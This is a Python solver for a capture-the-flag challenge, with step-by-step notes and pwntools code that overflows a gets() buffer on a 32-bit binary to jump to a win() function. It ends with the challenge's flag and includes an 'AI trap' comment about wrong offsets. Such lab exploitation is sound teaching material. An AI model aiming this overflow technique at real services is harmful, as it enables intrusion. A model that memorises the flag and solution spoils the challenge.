"""
C20 Solver — Winter Soldier's Terminal

Binary: 32-bit ELF, no stack canary, no PIE
Vulnerability: gets() on a 40-byte stack buffer

Step 1 — Find win() address:
  $ objdump -d mission_terminal | grep '<win>'
  → e.g. 08049196 <win>:

Step 2 — Find offset to EIP:
  Buffer = 40 bytes, then 4 bytes saved EBP, then EIP = 44 bytes total
  AI trap: Most online examples use 76 or 64-byte buffers.
           This one is 44. Using wrong offset redirects to garbage.
  
  Verify with: python3 -c "import pwn; pwn.cyclic(100)" → send → check EIP in gdb

Step 3 — Build payload:
  payload = b'A' * 44 + p32(win_addr)

Step 4 — Send:
"""
from pwn import *

HOST = "<host>"
PORT = 1337

# Find this with: objdump -d mission_terminal | grep '<win>'
WIN_ADDR = 0x08049196   # replace with actual address after build

p = remote(HOST, PORT)
p.recvuntil(b"code: ")
payload = b"A" * 44 + p32(WIN_ADDR)
p.sendline(payload)
print(p.recvall(timeout=2).decode())
# Output: Access granted: cyn0x{buff3r_0v3rfl0w_w1nt3r_s0ld13r}